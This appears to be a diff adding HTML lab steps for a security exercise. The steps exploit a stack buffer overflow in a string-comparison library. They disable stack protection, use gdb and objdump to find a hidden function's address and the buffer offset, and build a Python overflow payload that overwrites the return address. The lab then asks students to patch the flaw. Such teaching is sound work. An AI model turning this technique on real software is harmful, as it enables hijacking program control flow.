@@ -1,0 +1,25 @@
+<ol>
+    <li>Investigate strdiff.c to determine if there's any vulnerable lines of code</li>
+    <li>Create a program where 2 strings are compared, use strdiff library function similarity_percentage(str1, str2), compile with these security precautions disabled:
+        <ul>
+            <li><code>gcc -m32 -O0 -ggdb -fno-stack-protector -c strdiff.c -o strdiff.o</code></li>
+            <li><code>gcc -m32 -O0 -ggdb -fno-stack-protector -shared -o libstrdiff.so strdiff.o</code></li>
+            <li><code>gcc -m32 -O0 -ggdb -L/home/seed/Desktop/vul-lib-1 -lstrdiff -fno-stack-protector -o main_n main.c</code></li>
+        </ul>
+    </li>
+    <li>Use gdb to find address of the unreachable secret function bar()
+        <ol>
+            <li>gdb main</li>
+            <li>b main</li>
+            <li>r</li>
+            <li>p &amp;bar</li>
+        </ol>
+    </li>
+    <li>Use objdump -d main to view the disassembled code in conjunction with inspecting the strdiff.c code. We can pinpoint the buffer's offset by analyzing instructions like: <code>lea -0xOFFSET(%ebp), %eax</code> This instruction sets where the buffer begins in memory by subtracting an offset from the base pointer. Adding another 4 bytes will be where the return address for the function is located.</li>
+    <li>Prepare a payload such as <code>./main $(python3 -c 'print("a"*OFFSET + "\x00\x00\x00\x00")')</code> arg2
+        <ul>
+            <li>Note <code>\x00\x00\x00\x00</code> is the return address in little-endian format</li>
+        </ul>
+    </li>
+    <li>Patch the issue, input validation, etc. Try to exploit again.</li>
+</ol>
